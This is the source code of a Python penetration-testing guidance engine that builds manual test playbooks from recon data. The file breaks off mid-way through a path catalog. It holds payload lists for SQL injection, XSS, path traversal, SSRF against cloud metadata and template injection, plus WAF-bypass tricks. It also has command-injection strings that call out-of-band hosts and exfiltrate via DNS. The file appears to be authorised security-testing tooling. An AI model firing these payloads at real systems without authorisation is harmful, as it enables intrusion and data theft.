"""
TEST-GUIDANCE ENGINE  //  the brain of Round Table

Round Table does not exploit. Instead, for every attack surface the recon phase
uncovers, this engine emits a structured *test playbook* the human pentester /
bug-bounty hunter / red teamer can execute by hand:

  - what to test          (the weakness class)
  - where                 (exact endpoint / host / parameter)
  - how to test           (ordered manual steps)
  - recommended payloads  (copy-ready injection strings)
  - confidence            (how strongly recon signals this surface exists)
  - tools                 (Burp, sqlmap, curl, ...)
  - step-by-step cURL     (baseline + probe commands)
  - references            (WSTG IDs + PortSwigger topics)

It is 100% rule-based (no AI required). Knowledge is distilled from OWASP WSTG,
the PortSwigger Web Security Academy, and PayloadsAllTheThings.
"""
from __future__ import annotations

import hashlib
import re
from typing import Any, Iterable, Optional
from urllib.parse import urlparse

# ── references ──────────────────────────────────────────────────────────────
PS = "https://portswigger.net/web-security"
WSTG = "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing"

REFS = {
    "sqli": [{"t": "WSTG-INPV-05 · SQL Injection", "u": f"{PS}/sql-injection"}],
    "xss": [{"t": "WSTG-INPV-01/02 · XSS", "u": f"{PS}/cross-site-scripting"}],
    "redirect": [{"t": "WSTG-CLNT-04 · Open Redirect", "u": f"{PS}/dom-based/open-redirection"}],
    "ssrf": [{"t": "WSTG-INPV-19 · SSRF", "u": f"{PS}/ssrf"}],
    "lfi": [{"t": "WSTG-ATHZ-01 · Path Traversal / LFI", "u": f"{PS}/file-path-traversal"}],
    "cmdi": [{"t": "WSTG-INPV-12 · OS Command Injection", "u": f"{PS}/os-command-injection"}],
    "ssti": [{"t": "WSTG-INPV-18 · SSTI", "u": f"{PS}/server-side-template-injection"}],
    "xxe": [{"t": "WSTG-INPV-07 · XXE", "u": f"{PS}/xxe"}],
    "cors": [{"t": "WSTG-CLNT-07 · CORS", "u": f"{PS}/cors"}],
    "csrf": [{"t": "WSTG-SESS-05 · CSRF", "u": f"{PS}/csrf"}],
    "clickjacking": [{"t": "WSTG-CLNT-09 · Clickjacking", "u": f"{PS}/clickjacking"}],
    "idor": [{"t": "WSTG-ATHZ-04 · IDOR", "u": f"{PS}/access-control/idor"}],
    "authz": [{"t": "WSTG-ATHZ · Authorization", "u": f"{PS}/access-control"}],
    "auth": [{"t": "WSTG-ATHN · Authentication", "u": f"{PS}/authentication"}],
    "jwt": [{"t": "WSTG-SESS-10 · JWT", "u": f"{PS}/jwt"}],
    "takeover": [{"t": "WSTG-CONF-10 · Subdomain Takeover", "u": "https://github.com/EdOverflow/can-i-take-over-xyz"}],
    "vcs": [{"t": "WSTG-CONF-04 · Old/Backup & VCS Exposure", "u": f"{WSTG}/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information"}],
    "headers": [{"t": "WSTG-CONF-12 · Security Headers", "u": "https://owasp.org/www-project-secure-headers/"}],
    "cookies": [{"t": "WSTG-SESS-02 · Cookie Attributes", "u": f"{PS}/csrf/samesite-cookies"}],
    "email": [{"t": "Email Spoofing · SPF/DMARC", "u": "https://dmarcian.com/what-is-a-dmarc-record/"}],
    "graphql": [{"t": "WSTG-APIT-01 · GraphQL", "u": f"{PS}/graphql"}],
    "api": [{"t": "WSTG-APIT · API Testing", "u": "https://owasp.org/API-Security/editions/2023/en/0x11-t10/"}],
    "swagger": [{"t": "API Documentation Exposure", "u": "https://owasp.org/API-Security/editions/2023/en/0x11-t10/"}],
    "actuator": [{"t": "Spring Boot Actuator Exposure", "u": "https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html"}],
    "wordpress": [{"t": "WordPress Enumeration (WPScan)", "u": "https://wpscan.com/"}],
    "redis": [{"t": "Unauthenticated Redis", "u": "https://redis.io/docs/latest/operate/oss_and_stack/management/security/"}],
    "mongo": [{"t": "Unauthenticated MongoDB", "u": "https://www.mongodb.com/docs/manual/administration/security-checklist/"}],
    "elastic": [{"t": "Unauthenticated Elasticsearch", "u": "https://www.elastic.co/guide/en/elasticsearch/reference/current/security-minimal-setup.html"}],
    "hostheader": [{"t": "WSTG-INPV-17 · Host Header Injection", "u": f"{PS}/host-header"}],
    "methods": [{"t": "WSTG-CONF-06 · HTTP Methods", "u": f"{WSTG}/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods"}],
    "listing": [{"t": "WSTG-CONF-04 · Directory Listing", "u": f"{WSTG}/02-Configuration_and_Deployment_Management_Testing"}],
    "secrets": [{"t": "Exposed Secrets / .env", "u": "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url"}],
}

# ── parameter name hints (from RedTechniques Top-25 lists) ──────────────────
PARAMS = {
    "sqli": ["id", "page", "search", "category", "user", "order", "sort", "q"],
    "xss": ["q", "s", "search", "query", "keyword", "name", "message", "redirect"],
    "redirect": ["next", "url", "target", "redirect", "return", "returnUrl", "dest", "continue"],
    "ssrf": ["url", "uri", "path", "dest", "redirect", "callback", "domain", "feed", "host", "target"],
    "lfi": ["file", "path", "page", "include", "doc", "document", "template", "folder", "download"],
    "cmdi": ["cmd", "exec", "command", "ping", "query", "host", "ip", "domain"],
    "ssti": ["name", "search", "q", "query", "message", "email", "template", "greeting"],
}

# ── payload libraries (copy-ready; benign-first) ────────────────────────────
PAYLOADS = {
    "sqli": [
        "'",
        "1' ORDER BY 1-- -",
        "1' AND '1'='1",
        "1' AND SLEEP(5)-- -",
        "1' UNION SELECT NULL-- -",
        "1'||(SELECT '')||'",
    ],
    "xss": [
        "<script>alert(document.domain)</script>",
        "\"><img src=x onerror=alert(document.domain)>",
        "'-alert(document.domain)-'",
        "<svg onload=alert(document.domain)>",
        "javascript:alert(document.domain)",
    ],
    "redirect": [
        "https://example.com",
        "//example.com",
        "/\\example.com",
        "https:example.com",
        "https://TARGET.example.com",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80/",
        "http://localhost/",
        "http://[::1]/",
        "http://YOUR-COLLABORATOR-ID.oastify.com",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
        "..%2f..%2f..%2fetc%2fpasswd",
    ],
    "cmdi": ["; id", "| id", "$(id)", "`id`", "%0aid", "& ping -c 3 YOUR-COLLABORATOR-ID.oastify.com"],
    "ssti": ["${7*7}", "{{7*7}}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}"],
    "graphql": ["{__schema{types{name}}}", "{__typename}", "query{__schema{queryType{name}}}"],
}

# ── WAF / filter bypass techniques (per class) ──────────────────────────────
BYPASS = {
    "sqli": [
        "Comment out the rest: `-- -`, `#`, `/**/`, `;%00`",
        "Split keywords with inline comments: `UN/**/ION SE/**/LECT`, `SEL/*x*/ECT`",
        "Case toggling: `UnIoN SeLeCt` (defeats naive keyword blocklists)",
        "Whitespace alternates for a stripped space: `%09 %0a %0c %0d %a0 /**/ +` or `UNION(SELECT(1))`",
        "Encoding: URL-encode the quote `%27`, or double-encode `%2527` past one decode pass",
        "Nested keyword so removal reassembles it: `UNIONUNIONSELECTSELECT`",
    ],
    "xss": [
        "When `<script>` is blocked, use an event handler: `<svg onload=...>`, `<img src=x onerror=...>`, `<body onpageshow=...>`",
        "Obscure handlers that bypass filters: `onpointerover`, `onanimationstart`, `onfocus autofocus`",
        "No quotes / no parens: `<svg onload=alert`1`>` or `<svg/onload=confirm(1)>`",
        "Encoding: HTML entities `&lt;`, URL / double-URL, unicode escapes `\\u003c`",
        "Break the `javascript:` filter: `java%09script:`, `JaVaScRiPt:`, `java\\nscript:`",
        "Attribute breakout without `>`: `\" autofocus onfocus=alert(1) x=\"`",
    ],
    "redirect": [
        "Scheme/slashes: `//evil.com`, `/\\evil.com`, `https:evil.com`, `%2F%2Fevil.com`",
        "Confuse the parser with credentials/host: `https://trusted@evil.com`, `https://evil.com#trusted`, `https://evil.com?trusted`",
        "Allowlist-prefix trick: `https://trusted.evil.com`, `https://evil.com/trusted`",
    ],
    "ssrf": [
        "Alternate IP encodings for `127.0.0.1`: `0177.0.0.1` (octal), `2130706433` (decimal), `127.1`, `[::1]`, `0.0.0.0`",
        "Allowlist bypass: `trusted.com.evil.com`, `trusted.com@evil.com`, open-redirect chain, DNS rebinding",
        "Non-HTTP schemes: `gopher://`, `dict://`, `file://`, `http://169.254.169.254` (cloud metadata)",
    ],
    "lfi": [
        "Filtered traversal: `....//`, `..%2f`, `%252e%252e%252f` (double-encode), `..%c0%af`, `..\\/`",
        "Wrappers / truncation: `php://filter/convert.base64-encode/resource=`, trailing `%00` or long `/.` on old PHP",
        "Absolute + UNC: `/etc/passwd`, `\\\\attacker\\share` (Windows)",
    ],
    "cmdi": [
        "Separators: `;` `|` `&` `&&` `||` `%0a` (newline), `$(id)`, `` `id` ``",
        "When spaces are stripped: `${IFS}`, `{cat,/etc/passwd}`, `X=$'\\x20'`",
        "Blind / no output: exfil via OAST, e.g. `;nslookup $(whoami).oastify.com`",
    ],
    "ssti": [
        "Alternate delimiters if `{{ }}` is filtered: `${...}`, `#{...}`, `<%= %>`, `{%...%}`",
        "Gadget chains: `{{''.__class__.__mro__}}` (Python), `{{request|attr('application')}}`, concatenate blocked words",
    ],
    "crlf": [
        "Encode the CR/LF: `%0d%0a`, `%0D%0A`, or double-encode `%250d%250a` past one decode",
        "Unicode/overlong that some servers normalize: `%E5%98%8A%E5%98%8D`",
    ],
}


def _adv_curl(base: str, param: str, cls: str) -> list[dict]:
    """Advanced-cURL steps that show cURL doing the whole job for this class:
    auto-encoding, timing, redirect + header inspection, raw paths."""
    u = base.rstrip("/")

    def enc(value, desc):
        return {"desc": desc, "cmd": f"curl -sS -k -G {_sq(u + '/')} --data-urlencode {_sq(param + '=' + value)}"}

    common = [
        enc("PAYLOAD", "Auto-encode any payload safely (cURL URL-encodes -G data for you)"),
        {"desc": "Baseline vs probe by size / status / time (spots boolean, error, and time diffs)",
         "cmd": f"curl -sS -k -o /dev/null -w 'code=%{{http_code}} len=%{{size_download}} t=%{{time_total}}s\\n' {_sq(u + '/?' + param + '=1')}"},
    ]
    extra = {
        "sqli": [enc("1' AND SLEEP(5)-- -", "Time-based check (watch t= jump; cURL times it)")],
        "xss": [enc('rt"><x>marker', "Reflect a benign marker, then grep the response for rt\"><x>marker")],
        "ssrf": [enc("http://169.254.169.254/latest/meta-data/", "Aim at cloud metadata / an OAST host; watch for a server-side fetch")],
        "redirect": [{"desc": "Follow redirects and show where it lands (-i headers, -L follow)",
                      "cmd": f"curl -sS -k -i -L {_sq(u + '/?' + param + '=//example.com')}"}],
        "lfi": [{"desc": "Send a raw traversal path unmodified",
                 "cmd": f"curl -sS -k --path-as-is {_sq(u + '/?' + param + '=../../../../etc/passwd')}"}],
        "cmdi": [enc(";curl http://YOUR-OAST-ID.oastify.com", "Blind OAST check (watch your collaborator for a callback)")],
        "crlf": [{"desc": "Inject a header via CRLF, inspect response headers (-i)",
                  "cmd": f"curl -sS -k -i {_sq(u + '/?' + param + '=1%0d%0aX-Injected:rt')}"}],
    }
    return common + extra.get(cls, [])

# ── helpers ─────────────────────────────────────────────────────────────────
def _conf_label(v: int) -> str:
    return "High" if v >= 70 else ("Medium" if v >= 40 else "Low")


def _sq(s: str) -> str:
    """Single-quote a value for a shell command."""
    return "'" + str(s).replace("'", "'\\''") + "'"


def _gid(*parts: str) -> str:
    return hashlib.sha1("|".join(parts).encode()).hexdigest()[:10]


def _curl_first(tools: Optional[list[str]]) -> list[str]:
    """Advanced cURL can craft essentially any request, so lead every tool list
    with it. Other tools stay only where cURL genuinely can't reach (a browser
    for DOM rendering, a collaborator/OAST server, sqlmap for heavy automation)."""
    t = list(tools or [])
    if not any(str(x).lower().startswith("curl") for x in t):
        t = ["curl"] + t
    t.sort(key=lambda x: 0 if str(x).lower().startswith("curl") else 1)
    return t


def _finding(
    *,
    key: str,
    title: str,
    category: str,
    wstg: str,
    severity: str,
    confidence: int,
    surface: str,
    evidence: str,
    what: str,
    how: list[str],
    payloads: Optional[list[str]] = None,
    bypass: Optional[list[str]] = None,
    tools: Optional[list[str]] = None,
    curl_steps: Optional[list[dict]] = None,
    ref_keys: Optional[list[str]] = None,
    tags: Optional[list[str]] = None,
) -> dict[str, Any]:
    refs: list[dict] = []
    for rk in ref_keys or []:
        refs.extend(REFS.get(rk, []))
    return {
        "id": _gid(key, surface),
        "key": key,
        "title": title,
        "category": category,
        "wstg": wstg,
        "severity": severity.upper(),
        "confidence": confidence,
        "confidence_label": _conf_label(confidence),
        "surface": surface,
        "evidence": evidence,
        "what_to_test": what,
        "how_to_test": how,
        "payloads": payloads or [],
        "bypass": bypass or [],
        "tools": _curl_first(tools),
        "curl_steps": curl_steps or [],
        "references": [{"title": r["t"], "url": r["u"]} for r in refs],
        "tags": tags or [],
    }


def _base_urls(recon: dict) -> list[str]:
    """Every live application base URL, root domain fallback included."""
    urls: list[str] = []
    for h in recon.get("live_hosts", []):
        u = h.get("url")
        if u:
            urls.append(u.rstrip("/"))
    if not urls:
        dom = recon.get("target") or recon.get("domain")
        if dom:
            urls.append(f"https://{dom}")
    # de-dupe, keep order
    seen, out = set(), []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def _host_tech(h: dict) -> list[str]:
    return [t.lower() for t in (h.get("tech") or [])]


def _all_paths(recon: dict) -> dict[str, list[str]]:
    """base_url -> discovered paths, from directory-busting."""
    out: dict[str, list[str]] = {}
    for base, paths in (recon.get("dir_bust") or {}).items():
        got = []
        for p in paths or []:
            u = p.get("url") if isinstance(p, dict) else str(p)
            if u:
                got.append(u)
        if got:
            out[base.rstrip("/")] = got
    return out


SEVERITY_RANK = {"CRITICAL": 5, "HIGH": 4, "MEDIUM": 3, "LOW": 2, "INFO": 1, "UNKNOWN": 0}


# ═══════════════════════════════════════════════════════════════════════════
# RULES
# ═══════════════════════════════════════════════════════════════════════════
def _rule_security_headers(recon: dict) -> Iterable[dict]:
    http = recon.get("http") or {}
    if not http.get("ok"):
        return
    h = {k.lower(): v for k, v in (http.get("headers") or {}).items()}
    base = http.get("final_url") or f"https://{recon.get('target','')}"
    base = base.rstrip("/")

    if "content-security-policy" not in h:
        yield _finding(
            key="csp-missing", title="No Content-Security-Policy — expanded XSS surface",
            category="Injection", wstg="WSTG-CLNT-01", severity="MEDIUM", confidence=50,
            surface=base,
            evidence="Response has no Content-Security-Policy header.",
            what="Without CSP, any reflected/stored/DOM XSS executes unrestricted and can exfiltrate data.",
            how=[
                "Map every reflection point (search boxes, error messages, profile fields, URL fragments).",
                "Inject the payloads below and confirm they execute in a real browser (not just reflect).",
                "If a WAF blocks basic payloads, try the PortSwigger XSS cheat-sheet mutations.",
            ],
            payloads=PAYLOADS["xss"], tools=["Burp Suite Repeater", "browser DevTools", "curl"],
            curl_steps=[{"desc": "See what reflects a marker", "cmd": f"curl -sS -k {_sq(base + '/?q=rt_probe_7391')} | grep -n rt_probe_7391"}],
            ref_keys=["xss", "headers"], tags=["xss", "headers"],
        )
    if "x-frame-options" not in h and "content-security-policy" not in h:
        yield _finding(
            key="clickjacking", title="Framing not restricted — clickjacking", category="Client-Side",
            wstg="WSTG-CLNT-09", severity="LOW", confidence=45, surface=base,
            evidence="Neither X-Frame-Options nor CSP frame-ancestors present.",
            what="Sensitive state-changing pages may be embedded in an attacker iframe and clickjacked.",
            how=[
                "Build a PoC page with an <iframe src='TARGET'> and confirm it renders.",
                "Overlay a decoy control on a sensitive action (change email, delete, transfer).",
                "Only report where a meaningful action can be triggered by a framed click.",
            ],
            tools=["browser", "custom HTML PoC"],
            curl_steps=[{"desc": "Confirm no anti-framing header", "cmd": f"curl -sS -k -I {_sq(base)} | grep -iE 'x-frame-options|content-security-policy'"}],
            ref_keys=["clickjacking", "headers"], tags=["clickjacking"],
        )
    if "strict-transport-security" not in h and (http.get("is_https")):
        yield _finding(
            key="hsts-missing", title="No HSTS — SSL-strip / cookie leak over HTTP", category="Config",
            wstg="WSTG-CONF-07", severity="LOW", confidence=40, surface=base,
            evidence="HTTPS response lacks Strict-Transport-Security.",
            what="A MITM can downgrade to HTTP; session cookies without Secure leak on the first hit.",
            how=[
                "Confirm the site also answers on http:// and whether it 301s to https.",
                "Check whether session cookies carry the Secure flag (see cookie finding).",
            ],
            curl_steps=[{"desc": "Check http→https behavior", "cmd": f"curl -sS -I {_sq(base.replace('https://','http://'))}"}],
            ref_keys=["headers"], tags=["headers", "tls"],
        )

    cookie = h.get("set-cookie", "")
    if cookie:
        flags = []
        cl = cookie.lower()
        if "httponly" not in cl: flags.append("HttpOnly")
        if "secure" not in cl: flags.append("Secure")
        if "samesite" not in cl: flags.append("SameSite")
        if flags:
            yield _finding(
                key="cookie-flags", title=f"Session cookie missing {', '.join(flags)}", category="Session",
                wstg="WSTG-SESS-02", severity="MEDIUM" if "HttpOnly" in flags else "LOW", confidence=60,
                surface=base, evidence=f"Set-Cookie: {cookie[:120]}",
                what="Weak cookie attributes enable theft via XSS (no HttpOnly) or CSRF (no SameSite).",
                how=[
                    "Enumerate every cookie set on login and note missing flags.",
                    "If HttpOnly is absent, chain with any XSS to steal the session.",
                    "If SameSite is absent/None, test CSRF on state-changing endpoints.",
                ],
                ref_keys=["cookies", "csrf"], tags=["session", "cookies"],
            )


def _rule_cors(recon: dict) -> Iterable[dict]:
    for m in recon.get("misc", []) or []:
        if m.get("type") == "CORS Misconfiguration":
            url = m.get("url", "")
            sev = m.get("severity", "MEDIUM")
            yield _finding(
                key="cors", title="CORS misconfiguration — cross-origin data theft", category="Client-Side",
                wstg="WSTG-CLNT-07", severity=sev, confidence=80 if sev == "HIGH" else 65, surface=url,
                evidence=f"Observed: {m.get('detail','reflected Origin')}",
                what="The endpoint reflects an arbitrary Origin (and may allow credentials), letting a malicious site read authenticated responses.",
                how=[
                    "Confirm the reflected Origin with the curl below.",
                    "If Access-Control-Allow-Credentials: true is also returned, build an attacker-page fetch() PoC that reads a private response.",
                    "Trim the impact to a concrete data type (email, token, PII).",
                ],
                tools=["curl", "Burp Suite", "attacker HTML PoC"],
                curl_steps=[
                    {"desc": "Reflect a hostile Origin", "cmd": f"curl -sS -k -I -H 'Origin: https://evil.example' {_sq(url)}"},
                    {"desc": "Check ACAO + credentials", "cmd": f"curl -sS -k -D - -o /dev/null -H 'Origin: https://evil.example' {_sq(url)} | grep -i access-control"},
                ],
                ref_keys=["cors"], tags=["cors"],
            )
        if m.get("type") == "Exposed VCS":
            url = m.get("url", "")
            base = url.split("/.git")[0].split("/.svn")[0].split("/.hg")[0]
            yield _finding(
                key="vcs", title="Exposed version-control metadata — source disclosure", category="Config",
                wstg="WSTG-CONF-04", severity="HIGH", confidence=85, surface=url,
                evidence=f"Accessible: {m.get('detail', url)}",
                what="A reachable .git/.svn directory can be dumped to reconstruct source code, secrets, and history.",
                how=[
                    "Confirm the metadata file returns 200 with real content (not a catch-all page).",
                    "Dump the repository with git-dumper, then grep the source for secrets and hidden endpoints.",
                    "Report the most sensitive disclosed item (keys, internal hosts, business logic).",
                ],
                tools=["git-dumper", "curl", "trufflehog"],
                curl_steps=[
                    {"desc": "Confirm .git/HEAD", "cmd": f"curl -sS -k {_sq(base + '/.git/HEAD')}"},
                    {"desc": "Dump the repo (external tool)", "cmd": f"git-dumper {_sq(base + '/.git/')} ./dump_{urlparse(base).hostname or 'target'}"},
                ],
                ref_keys=["vcs", "secrets"], tags=["vcs", "disclosure"],
            )


def _rule_takeover(recon: dict) -> Iterable[dict]:
    for t in recon.get("takeover_candidates", []) or []:
        if t.get("severity") != "CRITICAL":
            continue
        sub = t.get("subdomain", "")
        yield _finding(
            key="takeover", title="Subdomain takeover candidate", category="Config",
            wstg="WSTG-CONF-10", severity="HIGH", confidence=75, surface=sub,
            evidence=t.get("reason", "dangling CNAME / provider fingerprint"),
            what="A dangling DNS record points at an unclaimed provider resource; claiming it hijacks the subdomain.",
            how=[
                "Resolve the CNAME chain and identify the provider.",
                "Cross-check the fingerprint against can-i-take-over-xyz.",
                "If claimable, register the resource and host a benign proof file, then report immediately.",
            ],
            tools=["dig", "nslookup", "provider console"],
            curl_steps=[
                {"desc": "Inspect CNAME chain", "cmd": f"dig +short CNAME {_sq(sub)}"},
                {"desc": "Fetch the current response", "cmd": f"curl -sS -k -I {_sq('https://' + sub)}"},
            ],
            ref_keys=["takeover"], tags=["takeover"],
        )


def _is_public_domain(host: str) -> bool:
    """DNS-policy checks (SPF/DMARC/CAA) only apply to real registrable domains,
    not internal names, IPs, or host:port targets."""
    host = (host or "").lower().strip().split(":")[0].strip(".")
    if not host or "." not in host:
        return False
    if host in ("localhost", "host.docker.internal"):
        return False
    if host.endswith((".local", ".internal", ".lan", ".localhost", ".test",
                      ".example", ".invalid", ".localdomain")):
        return False
    parts = host.split(".")
    if all(p.isdigit() for p in parts):   # IPv4
        return False
    tld = parts[-1]
    return len(tld) >= 2 and tld.isalpha()


def _rule_email(recon: dict) -> Iterable[dict]:
    em = recon.get("email") or {}
    dom = (recon.get("domain") or recon.get("target") or "").split(":")[0]
    if not _is_public_domain(dom):
        return
    missing = []
    if not em.get("spf"): missing.append("SPF")
    if not em.get("dmarc"): missing.append("DMARC")
    dmarc = (em.get("dmarc") or "").lower()
    weak_dmarc = em.get("dmarc") and ("p=none" in dmarc)
    if missing or weak_dmarc:
        detail = f"missing {', '.join(missing)}" if missing else "DMARC policy is p=none (monitor only)"
        yield _finding(
            key="email-spoof", title=f"Email spoofing exposure — {detail}", category="Config",
            wstg="WSTG-CONF-XX", severity="MEDIUM", confidence=55 if missing else 45, surface=dom,
            evidence=f"SPF={'set' if em.get('spf') else 'MISSING'}  DMARC={em.get('dmarc') or 'MISSING'}",
            what="Weak SPF/DMARC lets an attacker send mail that appears to come from this domain (phishing, BEC).",
            how=[
                "Confirm the SPF and DMARC records with dig.",
                "If DMARC is missing or p=none, craft a spoofed test email from a lab and confirm delivery.",
                "Report as email-spoofing / phishing enablement (many programs accept this).",
            ],
            tools=["dig", "swaks", "MailSpoof"],
            curl_steps=[
                {"desc": "Read SPF", "cmd": f"dig +short TXT {_sq(dom)} | grep spf1"},
                {"desc": "Read DMARC", "cmd": f"dig +short TXT {_sq('_dmarc.' + dom)}"},
            ],
            ref_keys=["email"], tags=["email", "spoofing"],
        )


def _rule_caa(recon: dict) -> Iterable[dict]:
    dom = (recon.get("domain") or recon.get("target") or "").split(":")[0]
    if not recon.get("caa_records") and _is_public_domain(dom):
        yield _finding(
            key="caa-missing", title="No CAA record — any CA may issue certificates", category="Config",
            wstg="WSTG-CRYP-XX", severity="LOW", confidence=35, surface=dom,
            evidence="No CAA DNS record found.",
            what="Without CAA, any certificate authority can issue a cert for the domain, widening mis-issuance risk.",
            how=["Confirm absence with dig CAA.", "Note as hardening; low bounty value on its own."],
            tools=["dig"],
            curl_steps=[{"desc": "Check CAA", "cmd": f"dig +short CAA {_sq(dom)}"}],
            ref_keys=["headers"], tags=["tls", "config"],
        )


def _param_finding(base: str, cls: str, title: str, category: str, wstg: str, severity: str,
                   confidence: int, what: str, how_extra: list[str], ref_keys: list[str],
                   tags: list[str], tools: list[str]) -> dict:
    p = PARAMS.get(cls, ["id"])[0]
    example = f"{base}/?{p}={{payload}}"
    steps = [
        f"Discover real parameters on {base} with cURL: fetch pages and grep for name=/href query strings "
        f"(e.g. curl -sS -k {base} | grep -oE '[?&][a-z_]+=' ).",
        f"Common {cls.upper()} parameter names to look for: {', '.join(PARAMS.get(cls, [])[:8])}.",
        *how_extra,
        "If a filter/WAF blocks the basic payload, apply the bypass techniques below.",
        "Escalate only a confirmed, reproducible case into a PoC with clear impact.",
    ]
    first = PAYLOADS.get(cls, [""])[0]
    curl = [
        {"desc": "Baseline (record normal response length/timing)", "cmd": f"curl -sS -k -o /dev/null -w 'len=%{{size_download}} time=%{{time_total}}s\\n' {_sq(base + '/?' + p + '=1')}"},
        {"desc": f"Probe with a {cls.upper()} marker", "cmd": f"curl -sS -k {_sq(base + '/?' + p + '=' + first)}"},
    ] + _adv_curl(base, p, cls)
    # cURL handles the request-crafting, so drop generic "Burp Suite" here; keep
    # specialist tools cURL can't replace (Collaborator/OAST, a browser, sqlmap).
    tools = [t for t in tools if "burp suite" not in t.lower()]
    return _finding(
        key=f"param-{cls}", title=title, category=category, wstg=wstg, severity=severity,
        confidence=confidence, surface=example,
        evidence=f"Live application at {base}; parameter-driven {cls.upper()} surface (apply to real params).",
        what=what, how=steps, payloads=PAYLOADS.get(cls, []), bypass=BYPASS.get(cls, []), tools=tools,
        curl_steps=curl, ref_keys=ref_keys, tags=tags,
    )


def _rule_param_injections(recon: dict) -> Iterable[dict]:
    bases = _base_urls(recon)[:6]
    for base in bases:
        yield _param_finding(
            base, "sqli", "SQL injection surface (query parameters)", "Injection", "WSTG-INPV-05",
            "HIGH", 45,
            "User-controllable parameters may reach a SQL query. Test for error-based, boolean, UNION, and time-based SQLi.",
            ["Send a single quote and look for SQL errors or a 500.",
             "Try boolean pairs (AND '1'='1 vs AND '1'='2) and compare responses.",
             "If blind, use a time-based payload (SLEEP/pg_sleep/WAITFOR) and confirm the delay.",
             "Confirm with sqlmap in manual/confirm mode before reporting."],
            ["sqli"], ["sqli", "injection"], ["Burp Suite", "sqlmap (manual)", "curl"],
        )
        yield _param_finding(
            base, "xss", "Reflected XSS surface (search/query params)", "Injection", "WSTG-INPV-01",
            "MEDIUM", 45,
            "Parameters reflected into HTML/JS without encoding lead to reflected or DOM XSS.",
            ["Inject a unique marker and find where it reflects (HTML body, attribute, script, URL).",
             "Break out of the context, then confirm script execution in a real browser."],
            ["xss"], ["xss", "injection"], ["Burp Suite", "browser", "curl"],
        )
        yield _param_finding(
            base, "redirect", "Open redirect surface", "Client-Side", "WSTG-CLNT-04",
            "LOW", 40,
            "Redirect parameters that accept external URLs enable phishing and can chain into SSRF/OAuth token theft.",
            ["Set the redirect param to an external domain and follow the response.",
             "Try bypasses: //evil, /\\evil, https:evil, whitelisted-host.evil."],
            ["redirect"], ["redirect"], ["Burp Suite", "curl"],
        )
        yield _param_finding(
            base, "ssrf", "SSRF surface (url/callback params)", "Injection", "WSTG-INPV-19",
            "HIGH", 40,
            "Parameters that fetch a URL server-side may be coerced to hit internal services or cloud metadata.",
            ["Point the param at a Burp Collaborator / OAST host and watch for a callback.",
             "If callbacks arrive, target 169.254.169.254 metadata and internal ranges."],
            ["ssrf"], ["ssrf", "injection"], ["Burp Collaborator", "interactsh", "curl"],
        )
        yield _param_finding(
            base, "lfi", "Path traversal / LFI surface (file/path params)", "Injection", "WSTG-ATHZ-01",
            "HIGH", 38,
            "Parameters that reference files may allow traversal to read arbitrary files or include remote content.",
            ["Request a known file via traversal (../../../../etc/passwd).",
             "Try encoding and null-byte/php filter variants if the naive payload is filtered."],
            ["lfi"], ["lfi", "traversal"], ["Burp Suite", "curl"],
        )
        yield _param_finding(
            base, "cmdi", "OS command injection surface (cmd/host/ip params)", "Injection", "WSTG-INPV-12",
            "HIGH", 36,
            "Parameters passed to a shell (ping, nslookup, converters, exporters) may allow OS command execution.",
            ["Append a shell metacharacter (; | & `$()`) plus a benign command like id, or ping your Collaborator.",
             "Look for command output in the response, or an out-of-band DNS/HTTP callback (blind).",
             "If neither, confirm with a timing payload (sleep 5) and measure the delay."],
            ["cmdi"], ["cmdi", "injection"], ["Burp Collaborator", "curl"],
        )
        yield _param_finding(
            base, "ssti", "Server-side / client-side template injection surface", "Injection", "WSTG-INPV-18",
            "HIGH", 36,
            "Input rendered into a template (server engines like Jinja2/Twig/Freemarker, or client-side AngularJS) can execute expressions → RCE or XSS.",
            ["Inject the polyglot {{7*7}} / ${7*7} / #{7*7} and look for 49 in the response.",
             "Identify the engine from which syntax evaluates, then use the matching sandbox-escape.",
             "For AngularJS/client-side, treat a rendered 49 as CSTI → in-browser JS execution."],
            ["ssti"], ["ssti", "injection"], ["tplmap (manual)", "Burp Suite", "curl"],
        )


def _rule_paths(recon: dict) -> Iterable[dict]:
    """Per discovered path (directory-busting) → targeted guidance."""
    catalog = [
        (re.compile(r"/\.env$|/\.env\."), "secrets", "Exposed .env / secrets file", "Config", "WSTG-CONF-04", "HIGH", 80,
         "Environment files commonly leak DB creds, API keys, and JWT secrets.",
         ["Fetch the file and grep for KEY/SECRET/PASSWORD/TOKEN.", "Validate any live credential in a safe, read-only way, then report."],
         ["secrets", "vcs"], ["secrets"]),
        (re.compile(r"/graphql|/graphiql|/api/graphql"), "graphql", "GraphQL endpoint — introspection & abuse", "API", "WSTG-APIT-01", "HIGH", 70,
         "GraphQL endpoints often allow introspection, batching abuse, and IDOR via node queries.",
         ["Run an introspection query to dump the schema.", "Enumerate mutations; test authz on each object type (BOLA).", "Check for query batching / alias-based rate-limit bypass."],
         ["graphql", "api"], ["graphql", "api"]),
        (re.compile(r"/swagger|/openapi|/api-docs|/v2/api-docs|/v3/api-docs"), "swagger", "API documentation exposed", "API", "WSTG-APIT-99", "MEDIUM", 70,
         "Swagger/OpenAPI exposure hands you the full API contract — enumerate every operation.",
         ["Load the spec, list all paths & methods.", "Test each endpoint for broken authorization and mass assignment."],
         ["swagger", "api"], ["api", "swagger"]),
        (re.compile(r"/actuator"), "actuator", "Spring Boot Actuator exposed", "Config", "WSTG-CONF-05", "HIGH", 72,
         "Actuator endpoints (/env, /heapdump, /trace) can leak secrets and enable RCE via /jolokia.",
         ["Enumerate /actuator; try /actuator/env, /actuator/heapdump, /actuator/mappings.", "Treat /heapdump and /jolokia as high impact."],
         ["actuator"], ["actuator", "config"]),
        (re.compile(r"/admin|/administrator|/wp-admin|/manage|/console"), "admin", "Admin / management panel", "Auth", "WSTG-ATHN-01", "MEDIUM", 55,
         "Admin panels are prime targets for default creds, weak auth, and missing access control.",
